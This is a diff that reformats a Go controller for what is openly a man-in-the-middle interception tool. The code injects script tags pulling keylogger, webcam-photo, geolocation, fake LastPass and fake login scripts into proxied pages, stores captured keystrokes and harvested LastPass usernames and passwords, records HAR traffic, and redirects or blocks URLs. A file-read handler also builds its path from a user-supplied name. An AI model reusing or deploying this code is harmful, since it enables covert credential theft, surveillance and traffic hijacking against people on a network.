@@ -3,8 +3,8 @@ package controllers
 import (
 	"github.com/revel/revel"
 	// "github.com/jeffail/gabs"
-	"log"
 	"io/ioutil"
+	"log"
 	// "os/exec"
 	"path/filepath"
 	"time"
@@ -13,8 +13,8 @@ import (
 )
 
 const (
-    PASSWORD = "demonstration"
-    SECURE = false
+	PASSWORD = "demonstration"
+	SECURE   = false
 )
 
 type App struct {
@@ -27,37 +27,44 @@ func (c App) GetField() revel.Result {
 	c.Params.Bind(&field, "field")
 	log.Println("field: ", field)
 	switch field {
-		case 0:
-			//its the har state
-			// log.Println("hars! ", globalStoreHAR)
-			return c.RenderJson(globalStoreHAR)
-		case 1: return c.RenderJson(globalRedirects)
-		case 2: return c.RenderJson(globalBlocks)
-		case 3: return c.RenderJson(globalWolfPack)
-		case 4: return c.RenderJson(globalInjectKeyLogger)
-		case 5: return c.RenderJson(globalInjectGetLocation)
-		case 6: return c.RenderJson(globalInjectLastpass)
-		default: return c.RenderJson("")
+	case 0:
+		//its the har state
+		// log.Println("hars! ", globalStoreHAR)
+		return c.RenderJson(globalStoreHAR)
+	case 1:
+		return c.RenderJson(globalRedirects)
+	case 2:
+		return c.RenderJson(globalBlocks)
+	case 3:
+		return c.RenderJson(globalWolfPack)
+	case 4:
+		return c.RenderJson(globalInjectKeyLogger)
+	case 5:
+		return c.RenderJson(globalInjectGetLocation)
+	case 6:
+		return c.RenderJson(globalInjectLastpass)
+	default:
+		return c.RenderJson("")
 	}
 }
 
 func InitiateProxy() {
 	//set the location for files
-    // log.Println("loading storage location")
-    _, proxyAddress := setFileStorageLocation()
-    //setting the logger to output to a file
+	// log.Println("loading storage location")
+	_, proxyAddress := setFileStorageLocation()
+	//setting the logger to output to a file
 
-    // log.Println("location: ", fileLocation, " address: ", proxyAddress)
-    //reset all parameters for the proxy
-	globalStoreHAR = true			
+	// log.Println("location: ", fileLocation, " address: ", proxyAddress)
+	//reset all parameters for the proxy
+	globalStoreHAR = true
 	globalProxyStandard = false
 	globalRedirects = false
 	globalBlocks = false
 	globalWolfPack = false
-	
+
 	//reset scripts
 	globalInjectKeyLogger = false
-	globalInjectGetLocation  = false
+	globalInjectGetLocation = false
 	globalInjectGetPhoto = false
 	globalInjectGetLogin = false
 	globalInjectLastpass = false
@@ -65,32 +72,32 @@ func InitiateProxy() {
 	//turn on the basic proxy
 	globalProxyStandard = true
 
-	INJECT_LOGGER_RESULT = "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/keylogger.js\"></script></body>" 
-	INJECT_PHOTO_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/takePhoto.js\"></script></body>"
-	INJECT_LOCATION_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/getLocation.js\"></script></body>"
-	INJECT_LASTPASS_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
-	INJECT_LOGIN_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/login.js\"></script></body>"
+	INJECT_LOGGER_RESULT = "<script src=\"http://" + proxyAddress + ":9000/public/InjectionScripts/keylogger.js\"></script></body>"
+	INJECT_PHOTO_RESULT = "<script src=\"http://" + proxyAddress + ":9000/public/InjectionScripts/takePhoto.js\"></script></body>"
+	INJECT_LOCATION_RESULT = "<script src=\"http://" + proxyAddress + ":9000/public/InjectionScripts/getLocation.js\"></script></body>"
+	INJECT_LASTPASS_RESULT = "<script src=\"http://" + proxyAddress + ":9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
+	INJECT_LOGIN_RESULT = "<script src=\"http://" + proxyAddress + ":9000/public/InjectionScripts/login.js\"></script></body>"
 	users = make(map[string]string)
 	//commented out arp scanner
 	//go arpScanner() //start the arpscanner in the background
 	// getRedirectUrls() //temporary
-	fetchdata();
+	fetchdata()
 }
 
 func (c App) FetchAllData() revel.Result {
-    return c.RenderJson("finished fetching")
+	return c.RenderJson("finished fetching")
 }
 func fetchdata() {
-	    //get the redirect pages from server
-    log.Println("downloading files")
-    // getPages()
-    //get a list of urls to redirect
-    log.Println("creating redirections...")
-    getRedirectUrls()
-    //get a list of urls to block
-    log.Println("get blocked urls...")
-    getBannedUrls()
-    log.Println("get news sites")
+	//get the redirect pages from server
+	log.Println("downloading files")
+	// getPages()
+	//get a list of urls to redirect
+	log.Println("creating redirections...")
+	getRedirectUrls()
+	//get a list of urls to block
+	log.Println("get blocked urls...")
+	getBannedUrls()
+	log.Println("get news sites")
 }
 func (c App) ArpScan() revel.Result {
 	return c.RenderJson(users)
@@ -110,6 +117,7 @@ func (c App) Login() revel.Result {
 func (c App) HarView() revel.Result {
 	return c.Render()
 }
+
 //
 func (c App) Index() revel.Result {
 	StartSimpleProxy()
@@ -128,7 +136,7 @@ func (c App) StartSimpleProxy() revel.Result {
 	} else {
 		globalProxyStandard = false
 	}
-	// Return 
+	// Return
 	log.Println("Proxy shutting down")
 	log.Println("location: ", fileLocation, " address: ", proxyAddress)
 	return c.RenderJson("{Proxy:'restarted}")
@@ -138,14 +146,14 @@ func (c App) StartSimpleProxy() revel.Result {
 func KillProxy() {
 	// if stoppableListener != nil {
 	var err error
-		stoppableListener.Close()
-		log.Println("waiting for socket to close")
+	stoppableListener.Close()
+	log.Println("waiting for socket to close")
 
-	    wg.Wait()
-        listener, err = net.Listen(CONN_TYPE, CONN_HOST + ":" + CONN_PORT) 
-	    if err != nil {
-	        log.Println("error here: ", err)
-	    }   
+	wg.Wait()
+	listener, err = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
+	if err != nil {
+		log.Println("error here: ", err)
+	}
 }
 
 func (c App) ToggleHarCollection() revel.Result {
@@ -244,7 +252,7 @@ func (c App) TriggerInjection() revel.Result {
 			globalInjectLastpass = false
 			// log.Println(" --- OPTION: Turning on Login Request")
 		}
-	} 
+	}
 	KillProxy()
 	StartSimpleProxy()
 	return c.RenderJson("")
@@ -276,7 +284,6 @@ func (c App) TriggerInjection() revel.Result {
 // 	return c.RenderJson(output)
 // }
 
-
 // func (c App) GetLocations() revel.Result {
 // 	return c.RenderJson(locations)
 // }
@@ -297,10 +304,10 @@ func (c App) TriggerInjection() revel.Result {
 // 	return c.RenderJson("location updated")
 // }
 
-
 func (c App) GetKeylogs() revel.Result {
 	return c.RenderJson(keylogs)
 }
+
 /*
 <input type="text" id="lppasswordbottom" class="lpinput" placeholder="Password">
 <input type="text" id="lppasswordtop" class="lpinput" placeholder="Password">
@@ -310,7 +317,7 @@ func (c App) Lastpass() revel.Result {
 	var password string
 	c.Params.Bind(&username, "lppasswordtop")
 	c.Params.Bind(&password, "lppasswordbottom")
-	var l Lastpass 
+	var l Lastpass
 	l.Username = username
 	l.Password = password
 	lastPassAccounts = append(lastPassAccounts, l)
@@ -347,26 +354,26 @@ func (c App) CatchKeyLog() revel.Result {
 func (c App) GetHars() revel.Result {
 	var fileNames []string
 	// log.Println("reading hars from: ", harLocation+"/hars/")
-	files, err := ioutil.ReadDir(harLocation+"/hars/")
+	files, err := ioutil.ReadDir(harLocation + "/hars/")
 	if err != nil {
 		// log.Println("error: ", err)
 	}
 	for _, f := range files {
 		// log.Println(f.Name())
-        fileNames = append(fileNames, f.Name())
-    }
+		fileNames = append(fileNames, f.Name())
+	}
 	return c.RenderJson(fileNames)
 }
 
 func (c App) GetHar() revel.Result {
 	var harName string
 	c.Params.Bind(&harName, "harname")
-    data, err := ioutil.ReadFile(harLocation+"/hars/"+harName)
-    // log.Println("location: ", harLocation+"/hars/"+harName)
-    if err != nil {
-    	return c.RenderJson("The file may not exist...")
-    }
-    // log.Println("har: ", string(data))
+	data, err := ioutil.ReadFile(harLocation + "/hars/" + harName)
+	// log.Println("location: ", harLocation+"/hars/"+harName)
+	if err != nil {
+		return c.RenderJson("The file may not exist...")
+	}
+	// log.Println("har: ", string(data))
 
 	// jsonParsed, _ := gabs.ParseJSON(data)
 	// log.Println(jsonParsed)
@@ -376,7 +383,7 @@ func (c App) GetHar() revel.Result {
 	//     log.Println(child.Data().(string))
 	// }
 
-    return c.RenderJson(string(data))
+	return c.RenderJson(string(data))
 }
 func (c App) Pinger() revel.Result {
 	return c.RenderJson(pingServer())
